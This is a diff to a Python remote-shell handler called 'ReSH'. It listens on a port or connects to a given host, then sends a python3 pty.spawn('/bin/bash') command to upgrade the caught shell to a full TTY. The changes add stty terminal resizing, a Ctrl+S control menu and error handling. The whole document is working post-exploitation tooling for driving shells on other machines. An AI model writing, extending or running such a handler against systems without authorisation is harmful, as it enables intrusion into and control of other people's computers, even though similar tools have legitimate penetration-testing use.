@@ -8,6 +8,7 @@ import threading
 import tty
 import time
 
+
 def setTTY():
 	fd = sys.stdin.fileno()
 	oldSet = termios.tcgetattr(fd)
@@ -44,14 +45,41 @@ def bind(port):
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	sock.bind(('', port))
 	sock.listen(1)
-	client, _ = sock.accept()
-	return client
+	client, addr = sock.accept()
+	print('{} <= {}'.format(client.getsockname()[0], addr[0]))
+	return sock, client
 
 def rc(sock):
 	rc_path = os.path.expanduser('~') + '/.reshrc'
 	if os.path.exists(rc_path):
 		with open(rc_path, 'rb') as fd:
 			sock.send(fd.read())
+
+def generateCmdRow():
+	size = os.get_terminal_size()
+	return 'stty rows {} columns {}\n'.format(size.lines, size.columns).encode()
+
+def choice():
+	global fd, oldSet
+	resetTTY(fd, oldSet)
+	print('')
+	print('(1) Exit')
+	print('(2) Resize Terminal')
+	print('(3) Reload Reshrc')
+	print('(4) Get IP')
+	setTTY()
+	cprint('> ')
+	chc = sys.stdin.read(1)
+	if chc == '1':
+		sock.send(b'exit\n')
+	elif chc == '2':
+		sock.send(generateCmdRow())
+	elif chc == '3':
+		rc(sock)
+	elif chc == '4':
+		print(sock.getsockname()[0], end='\r\n')
+		sock.send(b'\n')
+	return chc
 
 print('''
 ██████╗░███████╗░██████╗██╗░░██╗
@@ -62,7 +90,7 @@ print('''
 ╚═╝░░╚═╝╚══════╝╚═════╝░╚═╝░░╚═╝
 ''')
 if len(sys.argv) == 2:
-	sock = bind(int(sys.argv[1]))
+	serv, sock = bind(int(sys.argv[1]))
 elif len(sys.argv) == 3:
 	sock = connect(sys.argv[1], int(sys.argv[2]))
 else:
@@ -73,12 +101,14 @@ Server: resh [PORT]''')
 
 sock.send(b'export TERM=xterm\n')
 sock.send(b'python3 -c \'import pty;pty.spawn("/bin/bash")\'\n')
+cprint('\r\n')
 
 fd, oldSet = setTTY()
 thr = threading.Thread(target=recvLoop, args=(sock,))
 thr.start()
 
 time.sleep(1)
+sock.send(generateCmdRow())
 rc(sock)
 
 while True:
@@ -88,11 +118,22 @@ while True:
 	elif c == '²' or c == 'Ω':
 		sock.send(b'exit\n')
 		break
+	elif c == '\x13': # Ctrl+s
+		chc = choice()
+		if chc == '1':
+			break
+		continue
 	try:
 		sock.send(c.encode())
 	except BrokenPipeError:
 		break
+	except OSError:
+		print('\r\nOSError: Close ReSH\r')
+		break
+	except Exception as e:
+		print(e)
 
 resetTTY(fd, oldSet)
 sock.close()
+serv.close()
 thr.join()
